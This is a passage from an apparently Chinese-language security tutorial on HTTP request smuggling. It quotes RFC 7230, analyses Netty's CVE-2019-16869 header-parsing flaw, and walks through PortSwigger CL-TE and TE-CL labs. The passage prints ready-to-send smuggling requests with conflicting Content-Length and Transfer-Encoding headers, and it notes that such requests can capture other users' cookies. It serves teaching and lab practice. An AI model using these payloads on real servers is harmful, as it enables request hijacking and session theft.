upstream message processor, then the recipient MUST either reject the message as invalid or replace the duplicated field-values with a single valid Content-Length field containing that decimal value prior to determining the message body length or forwarding the message.</p></blockquote><p>And <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3" target="_blank" rel="noopener">RFC 7230 section 3.3.3</a> &#x4E2D;&#x4E5F;&#x63D0;&#x5230;&#xFF1A;</p><blockquote><p>If a message is received without Transfer-Encoding and with either multiple Content-Length header fields having differing field-values or a single Content-Length header field having an invalid value, then the message framing is invalid and the recipient MUST treat it as an unrecoverable error. If this is a request message, the server MUST respond with a 400 (Bad Request) status code and then close the connection.</p></blockquote><p>RFC &#x5F53;&#x4E2D;&#x5BF9;&#x4E8E;&#x8FD9;&#x4E2D;&#x60C5;&#x51B5;&#x4E5F;&#x6709;&#x4E86;&#x6BD4;&#x8F83;&#x660E;&#x786E;&#x7684;&#x89C4;&#x8303;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x5047;&#x8BBE;&#x4E3E;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#xFF0C;&#x6211;&#x4EEC;&#x53D1;&#x9001;&#x4EE5;&#x4E0B;&#x8BF7;&#x6C42;&#xFF1A;</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /suzann.html HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 0\r\n</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 46\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /walter.html HTTP/1.1\r\n</span><br><span class="line"><span class="hljs-attribute">Host</span>: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>&#x5728;&#x8FD9;&#x91CC;&#xFF0C;&#x6211;&#x4EEC;&#x5047;&#x8BBE; Front &#x670D;&#x52A1;&#x5668;&#x4EE5;&#x7B2C;&#x4E8C;&#x4E2A; Content-Length &#x4E3A;&#x89E3;&#x6790;&#x6807;&#x51C6;&#xFF0C;&#x629B;&#x5F03;&#x7B2C;&#x4E00;&#x4E2A; Content-Length &#x5B57;&#x6BB5;&#x6216;&#x8005;&#x5BF9;&#x7B2C;&#x4E00;&#x4E2A;&#x4E0D;&#x505A;&#x4EFB;&#x4F55;&#x5904;&#x7406;&#x6216;&#x8005; anything else &#xFF0C;&#x53CD;&#x6B63;&#x5047;&#x8BBE;&#x5B83;&#x53EA;&#x5904;&#x7406;&#x7B2C;&#x4E8C;&#x4E2A; Content-Length &#x5B57;&#x6BB5;&#xFF1B;&#x6211;&#x4EEC;&#x5728;&#x5047;&#x8BBE; Backend&#x670D;&#x52A1;&#x5668;&#x4EE5;&#x7B2C;&#x4E00;&#x4E2A; Content-Length &#x5B57;&#x6BB5;&#x4E3A;&#x89E3;&#x6790;&#x6807;&#x51C6;&#xFF0C;&#x4E0D;&#x7406;&#x4F1A;&#x7B2C;&#x4E8C;&#x4E2A;&#x3002;</p><p>&#x8FD9;&#x6837;&#x5C31;&#x76F8;&#x5F53;&#x4E8E;&#x6211;&#x4EEC;&#x5728; HTTP &#x8BF7;&#x6C42;&#x4E2D;&#x6CE8;&#x5165;&#x4E86;&#x53E6;&#x4E00;&#x4E2A; HTTP &#x8BF7;&#x6C42;&#xFF0C;&#x5982;&#x679C;&#x6574;&#x4E2A;&#x573A;&#x666F;&#x50CF;&#x6211;&#x4EEC;&#x4E0A;&#x8FF0;&#x8FD9;&#x6837;&#xFF0C;&#x5C31;&#x5B58;&#x5728; HTTP Smuggling &#x653B;&#x51FB;&#x3002;</p><p>&#x5982;&#x8FC7;&#x670D;&#x52A1;&#x5668;&#x4EE5;&#x7B2C;&#x4E00;&#x4E2A; Content-Length &#x4E3A;&#x89E3;&#x6790;&#x6807;&#x51C6;&#xFF0C;&#x8FD9;&#x6837;&#x89E3;&#x6790;&#x5C31;&#x4F1A;&#x51FA;&#x73B0;&#x4E24;&#x4E2A; HTTP &#x8BF7;&#x6C42;&#xFF0C;&#x5982;&#x679C;&#x4EE5;&#x7B2C;&#x4E8C;&#x4E2A;&#x4F5C;&#x4E3A;&#x89E3;&#x6790;&#x6807;&#x51C6;&#xFF0C;&#x5219;&#x4F1A;&#x8BA4;&#x4E3A;&#x53EA;&#x6709;&#x4E00;&#x4E2A; HTTP &#x8BF7;&#x6C42;&#x3002;</p><h3 id="Optional-WhiteSpace"><a href="#Optional-WhiteSpace" class="headerlink" title="Optional WhiteSpace"></a>Optional WhiteSpace</h3><p>RFC7320 &#x4E2D;&#x5BF9;&#x4E8E; header &#x5B57;&#x6BB5;&#x6709;&#x8FD9;&#x6837;&#x7684;&#x63CF;&#x8FF0;&#xFF1A;</p><blockquote><p>3.2.  Header Fields</p><p>   Each header field consists of a case-insensitive field name followed<br>   by a colon (&#x201C;:&#x201D;), optional leading whitespace, the field value, and<br>   optional trailing whitespace.</p><p>   header-field   = field-name &#x201C;:&#x201D; OWS field-value OWS</p><pre><code>field-name     = tokenfield-value    = *( field-content / obs-fold )field-content  = field-vchar [ 1*( SP / HTAB ) field-vchar ]field-vchar    = VCHAR / obs-textobs-fold       = CRLF 1*( SP / HTAB )               ; obsolete line folding               ; see Section 3.2.4</code></pre><p>   The field-name token labels the corresponding field-value as having<br>   the semantics defined by that header field.  For example, the Date<br>   header field is defined in Section 7.1.1.2 of [RFC7231] as containing<br>   the origination timestamp for the message in which it appears.</p></blockquote><p>&#x5C24;&#x5176;&#x662F;&#x5F00;&#x5934;&#x7684;&#x4E00;&#x53E5;&#x8BDD;&#x8868;&#x660E;&#xFF0C;&#x5B57;&#x6BB5;&#x540E;&#x9762;&#x5E94;&#x8BE5;&#x7D27;&#x8DDF;<code>:</code>&#x5192;&#x53F7;&#xFF0C;&#x7136;&#x540E;&#x662F; OWS(Optional WhiteSpace) &#x53EF;&#x9009;&#x7684;&#x7A7A;&#x683C;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x662F;&#x5B57;&#x6BB5;&#x503C;&#xFF0C;&#x6700;&#x540E;&#x662F; OWS &#x53EF;&#x9009;&#x7A7A;&#x683C;&#x3002;</p><p>&#x8FD9;&#x4E2A;&#x4F1A;&#x5B58;&#x5728;&#x4EC0;&#x4E48;&#x95EE;&#x9898;&#x5462;&#xFF1F;&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x4E2D;&#x95F4;&#x4EF6;&#x5BF9;&#x4E8E;&#x8FD9;&#x4E2A;&#x7684;&#x5B9E;&#x73B0;&#x5E76;&#x6CA1;&#x6709;&#x4E25;&#x683C;&#x9075;&#x5FAA; RFC &#x6807;&#x51C6;&#x7684;&#x8BDD;&#xFF0C;&#x4E5F;&#x4F1A;&#x4EA7;&#x751F; HTTP Smuggling &#x653B;&#x51FB;&#x3002;</p><p>&#x6BD4;&#x8F83;&#x5178;&#x578B;&#x7684;&#x4F8B;&#x5B50;&#x5C31;&#x662F; CVE-2019-16869 &#xFF0C;&#x8FD9;&#x679A; CVE &#x662F; OPPO &#x5B50;&#x5348;&#x4E92;&#x8054;&#x7F51;&#x5B89;&#x5168;&#x5B9E;&#x9A8C;&#x5BA4;&#x53D1;&#x6398;&#x7684;&#xFF0C;&#x662F;&#x5173;&#x4E8E; Netty &#x4E2D;&#x95F4;&#x4EF6;&#x5B58;&#x5728; HTTP Smuggling &#x6F0F;&#x6D1E;&#x3002;</p><p>&#x5728; Netty 4.1.42.Final &#x7248;&#x672C;&#x4E4B;&#x524D;&#x5BF9;&#x4E8E; Header &#x5934;&#x7684;&#x5904;&#x7406;&#x662F;&#x4F7F;&#x7528; <a href="https://github.com/netty/netty/blob/netty-4.1.41.Final/codec-http/src/main/java/io/netty/handler/codec/http/HttpObjectDecoder.java" target="_blank" rel="noopener">splitHeader</a> &#x65B9;&#x6CD5;&#xFF0C;&#x5176;&#x4E2D;&#x5173;&#x952E;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span> (nameEnd = nameStart; nameEnd &lt; length; nameEnd ++) {</span><br><span class="line">  <span class="hljs-keyword">char</span> ch = sb.charAt(nameEnd);</span><br><span class="line">  <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&apos;:&apos;</span> || Character.isWhitespace(ch)) {</span><br><span class="line">    <span class="hljs-keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>&#x5176;&#x4ED6;&#x7684;&#x4EE3;&#x7801;&#x6211;&#x4EEC;&#x5E76;&#x4E0D;&#x9700;&#x8981;&#x8FC7;&#x591A;&#x4E86;&#x89E3;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x8FD9;&#x91CC;&#x5C06;&#x7A7A;&#x683C;&#x4E0E;<code>:</code>&#x5192;&#x53F7;&#x540C;&#x6837;&#x5904;&#x7406;&#x4E86;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5982;&#x679C;&#x5B58;&#x5728;&#x7A7A;&#x683C;&#x4F1A;&#x628A;<code>:</code>&#x5176;&#x4E4B;&#x524D;&#x7684; field name &#x6B63;&#x5E38;&#x5904;&#x7406;&#xFF0C;&#x5E76;&#x4E0D;&#x4F1A;&#x629B;&#x51FA;&#x9519;&#x8BEF;&#x6216;&#x8005;&#x8FDB;&#x884C;&#x5176;&#x4ED6;&#x64CD;&#x4F5C;&#x3002;&#x8FD9;&#x6837;&#x5C31;&#x4E0E; RFC &#x6807;&#x51C6;&#x7684;&#x89C4;&#x8303;&#x4E0D;&#x4E00;&#x81F4;&#x4E86;&#xFF0C;&#x4E8E;&#x662F;&#x5C31;&#x4F1A;&#x4EA7;&#x751F;&#x89E3;&#x6790;&#x5DEE;&#x5F02;&#x3002;</p><p>@Bi3g0 &#x6784;&#x5EFA;&#x4E86;&#x6BD4;&#x8F83;&#x6E05;&#x6670;&#x7684;&#x6F0F;&#x6D1E;&#x539F;&#x7406;&#x56FE;&#xFF1A;</p><p><img src="https://user-images.githubusercontent.com/18691823/65211134-3e03cd00-dad0-11e9-94a5-b9f04ea18f38.png" alt></p><p>&#x8FD9;&#x91CC;&#x7528;&#x7684;&#x4F8B;&#x5B50;&#x662F;&#x91C7;&#x7528; ELB &#x4F5C;&#x4E3A; Front &#x670D;&#x52A1;&#x5668;&#xFF0C;Netty &#x4F5C;&#x4E3A; Backend &#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;&#x4E3E;&#x4F8B;&#xFF0C;&#x6211;&#x4EEC;&#x53D1;&#x9001;&#x5982;&#x4E0B;&#x8BF7;&#x6C42;&#xFF1A;</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/getusers</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: www.backend.com</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 64</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /hacker HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: www.hacker.com</span><br><span class="line"><span class="hljs-attribute">hacker</span>: hacker</span><br></pre></td></tr></table></figure><p>ELB &#x4F1A;&#x5C06; Transfer-Encoding &#x5B57;&#x6BB5;&#x5FFD;&#x7565;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x4E0E;&#x5192;&#x53F7;&#x4E2D;&#x95F4;&#x6709;&#x4E00;&#x4E2A;&#x7A7A;&#x683C;&#xFF0C;&#x4E0D;&#x7B26;&#x5408; RFC &#x6807;&#x51C6;&#xFF0C;&#x4F1A;&#x4F7F;&#x7528; Content-Length &#x4F5C;&#x4E3A;&#x89E3;&#x6790;&#x6807;&#x51C6;&#xFF0C;&#x4E8E;&#x662F;&#x4F1A;&#x8BA4;&#x4E3A;&#x4EE5;&#x4E0A;&#x8BF7;&#x6C42;&#x662F;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x7EE7;&#x800C;&#x6254;&#x7ED9; Backend &#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4E5F;&#x5C31;&#x662F; Netty &#xFF0C;Netty &#x5728;&#x8FD9;&#x91CC;&#x4F1A;&#x4F18;&#x5148;&#x89E3;&#x6790; Transfer-Encoding &#xFF0C;&#x5373;&#x4F7F;&#x8FD9;&#x4E2A;&#x5B57;&#x6BB5;&#x4E0D;&#x7B26;&#x5408; RFC &#x6807;&#x51C6;&#xFF0C;&#x4F46;&#x662F;&#x56E0;&#x4E3A;&#x5B83;&#x7684;&#x5B9E;&#x73B0;&#x65B9;&#x5F0F;&#x4E0D;&#x4E25;&#x683C;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x56E0;&#x4E3A;&#x4F18;&#x5148;&#x89E3;&#x6790; Transfer-Encoding &#x7684;&#x539F;&#x56E0;&#xFF0C;&#x5B83;&#x4F1A;&#x5C06;&#x8FD9;&#x4E2A;&#x8BF7;&#x6C42;&#x62C6;&#x5206;&#x4E3A;&#x4E24;&#x4E2A;&#x8BF7;&#x6C42;&#xFF1A;</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/getusers</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: www.backend.com</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 64</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></table></figure><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/hacker</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: www.hacker.com</span><br><span class="line"><span class="hljs-attribute">hacker</span>: hacker</span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x6837;&#x5C31;&#x9020;&#x6210;&#x4E86; HTTP Smuggling &#x653B;&#x51FB;&#x3002;</p><p>Netty &#x4E8E; 4.1.42 Final &#x7248;&#x672C;&#x4FEE;&#x590D;&#x4E86;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#xFF1A;<a href="https://github.com/netty/netty/pull/9585" target="_blank" rel="noopener">Correctly handle whitespaces in HTTP header names as defined by RFC72&#x2026;</a></p><p>&#x5F53;&#x6211;&#x4EEC;&#x53D1;&#x9001; field name &#x4E0E; : &#x4E4B;&#x95F4;&#x6709;&#x7A7A;&#x683C;&#x7684; header &#x8BF7;&#x6C42;&#x65F6;&#xFF0C; netty &#x4F1A;&#x201C;&#x6B63;&#x786E;&#x201D;&#x5730;&#x8FD4;&#x56DE; 400 &#x3002;</p><h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h3><p>&#x63A5;&#x4E0B;&#x6765;&#x51E0;&#x4E2A;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; @portswigger &#x63D0;&#x4F9B;&#x7684;&#x51E0;&#x4E2A; Lab &#x7ED9;&#x6211;&#x4EEC;&#x8FDB;&#x884C;&#x7EC3;&#x4E60;&#x4EE5;&#x52A0;&#x6DF1;&#x7406;&#x89E3;&#x2014;&#x2014;<a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">HTTP request smuggling</a></p><p>&#x5728;&#x505A;&#x4E4B;&#x524D;&#x8BB0;&#x5F97;&#x8981;&#x628A; BurpSuite &#x7684;&#x81EA;&#x52A8;&#x66F4;&#x65B0; Content-Length &#x529F;&#x80FD;&#x53D6;&#x6D88;&#x4E86;&#x3002;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191013185654.jpg" alt></p><p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x6765;&#x770B; CL-TE &#x7684;&#x60C5;&#x51B5;&#xFF1A;<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener">Lab: HTTP request smuggling, basic CL.TE vulnerability</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn&#x2019;t support chunked encoding. The front-end server rejects requests that aren&#x2019;t using the GET or POST method.</p><p>To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.</p></blockquote><p>&#x6839;&#x636E;&#x9898;&#x76EE;&#x63D0;&#x793A;&#xFF0C;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x8BA9; Backend &#x670D;&#x52A1;&#x5668;&#x6536;&#x5230; GPOST &#x65B9;&#x6CD5;&#x5373;&#x53EF;&#xFF0C;&#x800C;&#x4E14;&#x573A;&#x666F;&#x4E5F;&#x660E;&#x786E;&#x544A;&#x8BC9;&#x6211;&#x4EEC;&#x662F;&#x4E00;&#x79CD; CL-TE &#x7684;&#x573A;&#x666F;&#x3002;</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 6</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line"><span class="hljs-attribute">G</span></span><br></pre></td></tr></table></figure><p>&#x6839;&#x636E;&#x9898;&#x76EE;&#x7684;&#x63D0;&#x793A;&#x8981;&#x6C42;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x53D1;&#x9001;&#x4E24;&#x6B21;&#x4EE5;&#x4E0A; HTTP &#x8BF7;&#x6C42;&#x5305;&#xFF1A;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191013190441.jpg" alt></p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191013190452.jpg" alt></p><p>&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7B2C;&#x4E8C;&#x6B21;&#x8BF7;&#x6C42;&#x6784;&#x9020;&#x51FA; GPOST &#x7684; HTTP Method &#x4E86;&#xFF0C;&#x8BE6;&#x7EC6;&#x7684;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6309;&#x7167;&#x4E0B;&#x9762;&#x8FD9;&#x4E2A;&#x6D41;&#x7A0B;&#x56FE;&#x6765;&#x770B;&#x770B;&#xFF1A;</p><figure class="highlight gherkin hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">User            Front           Backend</span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|</span><br><span class="line">|<span class="hljs-string">--A(1A+1/2B)--&gt;</span>|<span class="hljs-string">               </span>|<span class="hljs-string"> </span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">--A(1A+1/2B)--&gt;</span>|<span class="hljs-string"> </span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">&lt;-A(200)-------</span>|</span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line">|<span class="hljs-string">&lt;-A(200)-------</span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line">|<span class="hljs-string">--C-----------&gt;</span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">--C-----------&gt;</span>|<span class="hljs-string"> * ending B *</span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">&lt;--B(200)------</span>|</span><br><span class="line">|<span class="hljs-string">&lt;--B(200)------</span>|<span class="hljs-string">               </span>|</span><br></pre></td></tr></table></figure><ul><li>1A + 1/2B &#x8868;&#x793A;&#x7684;&#x662F;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x8BF7;&#x6C42; A + &#x4E00;&#x4E2A;&#x4E0D;&#x5B8C;&#x6574;&#x7684;&#x8BF7;&#x6C42; B</li><li>A(X) : &#x8868;&#x793A; X &#x8BF7;&#x6C42;&#x9690;&#x85CF;&#x5728; A &#x8BF7;&#x6C42;&#x7684; body &#x5F53;&#x4E2D;</li><li>ending B: &#x8BF7;&#x6C42; C &#x7B2C;&#x4E00;&#x884C;&#x88AB;&#x62FC;&#x63A5;&#x5230;&#x4E86;&#x4E0D;&#x5B8C;&#x6574;&#x7684;&#x8BF7;&#x6C42; B &#x7684; header &#x5934;&#x5F53;&#x4E2D;&#xFF0C;&#x8BF7;&#x6C42; C &#x5176;&#x4ED6;&#x6240;&#x6709;&#x7684;&#x8BF7;&#x6C42;&#x5934;&#x90FD;&#x88AB;&#x6DFB;&#x52A0;&#x5230;&#x4E86;&#x8BF7;&#x6C42; B &#x5F53;&#x4E2D;&#xFF0C;&#x8FD9;&#x6837;&#x8BF7;&#x6C42; C &#x5C31;&#x76F8;&#x5F53;&#x4E8E;&#x6D88;&#x5931;&#x4E86;&#xFF0C;&#x8BF7;&#x6C42; B &#x4F1A;&#x5E26;&#x7740;&#x8BF7;&#x6C42; C &#x7684;&#x8BF7;&#x6C42;&#x5934;&#x53BB;&#x8BF7;&#x6C42;&#x540E;&#x6BB5;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5305;&#x62EC; Cookie &#x5B57;&#x6BB5;&#x6216;&#x8005;&#x5176;&#x4ED6;&#x4EC0;&#x4E48;&#x8BA4;&#x8BC1;&#x5B57;&#x6BB5;</li></ul><p>&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x5C31;&#x662F;&#xFF0C;&#x6211;&#x4EEC;&#x53D1;&#x9001;&#x4EE5;&#x4E0A;&#x8BF7;&#x6C42;&#xFF0C;&#x5F53; Front &#x670D;&#x52A1;&#x5668;&#x4F18;&#x5148;&#x4EE5; CL &#x5904;&#x7406;&#x65F6;&#xFF0C;&#x4F1A;&#x8BA4;&#x4E3A;</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">0\r\n</span></span><br><span class="line"><span class="hljs-attribute">\r\n</span></span><br><span class="line"><span class="hljs-attribute">G</span></span><br></pre></td></tr></table></figure><p>&#x4EE5;&#x4E0A; 6 &#x4E2A;&#x5B57;&#x8282;&#x4E3A;&#x8BF7;&#x6C42; A &#x7684; body &#xFF0C;&#x4F1A;&#x5C06;&#x8FD9;&#x4E2A;&#x8BF7;&#x6C42; A &#x5F53;&#x4F5C;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x8BF7;&#x6C42;&#x8F6C;&#x53D1;&#x5230;&#x540E;&#x7AEF;&#xFF0C;&#x800C;&#x5F53; Backend &#x670D;&#x52A1;&#x5668;&#x4F18;&#x5148;&#x4EE5; TE &#x5904;&#x7406;&#x65F6;&#xFF0C;&#x4F1A;&#x8BA4;&#x4E3A;</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 6</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x4E2A;&#x662F;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#xFF0C;&#x5355;&#x72EC;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x800C;</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">G</span></span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x4E2A;&#x4ED6;&#x4F1A;&#x89C6;&#x4E3A;&#x4E00;&#x4E2A;&#x4E0D;&#x5B8C;&#x6574;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x9020;&#x6210;&#x4E86; 1/2 B &#x8BF7;&#x6C42;&#x7684;&#x4EA7;&#x751F;&#xFF0C;&#x4E8E;&#x662F;&#x4F1A;&#x5728; Backend &#x670D;&#x52A1;&#x5668;&#x7F13;&#x51B2;&#x533A;&#x5904;&#x7B49;&#x5F85;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x7684;&#x5230;&#x6765;&#x4EE5;&#x4F7F;&#x5F97;&#x5C06; 1/2 B &#x62FC;&#x63A5;&#x6210;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x5F53;&#x6211;&#x4EEC;&#x53D1;&#x9001;&#x7B2C;&#x4E8C;&#x904D;&#x8BF7;&#x6C42;&#x7684;&#x65F6;&#x5019;&#xFF0C;POST &#x4F1A;&#x62FC;&#x63A5;&#x5230; G &#x540E;&#x9762;&#xFF0C;&#x6240;&#x4EE5; HTTP Method &#x4F1A;&#x53D8;&#x6210; GPOST &#x65B9;&#x6CD5;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x770B;&#x5230;&#x7684;&#x5F97;&#x5230;&#x7684;&#x56DE;&#x663E;&#xFF0C;&#x65E0;&#x6CD5;&#x8BC6;&#x522B;&#x7684; HTTP Method GPOST&#x3002;</p><h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h3><p>&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x6765;&#x770B; TE-CL &#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x540C;&#x6837;&#x6211;&#x4EEC;&#x501F;&#x52A9; LAB &#x5B9E;&#x9A8C;&#x6765;&#x52A0;&#x6DF1;&#x7406;&#x89E3;&#xFF1A;<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noopener">Lab: HTTP request smuggling, basic TE.CL vulnerability</a></p><blockquote><p>This lab involves a front-end and back-end server, and the back-end server doesn&#x2019;t support chunked encoding. The front-end server rejects requests that aren&#x2019;t using the GET or POST method.</p><p>To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.</p></blockquote><p>&#x6309;&#x7167;&#x9898;&#x76EE;&#x63D0;&#x793A;&#xFF0C;&#x6211;&#x4EEC;&#x8981;&#x8FBE;&#x5230;&#x7684;&#x4ECD;&#x7136;&#x662F;&#x8BA9;&#x540E;&#x7AEF;&#x6536;&#x5230; GPOST &#x8BF7;&#x6C42;&#xFF0C;&#x800C;&#x4E14;&#x573A;&#x666F;&#x4E5F;&#x660E;&#x786E;&#x544A;&#x8BC9;&#x6211;&#x4EEC;&#x662F;&#x4E00;&#x79CD; TE-CL &#x7684;&#x573A;&#x666F;&#x3002;</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: acde1ffc1f047f9f8007186200ff00fe.web-security-academy.net</span><br><span class="line"><span 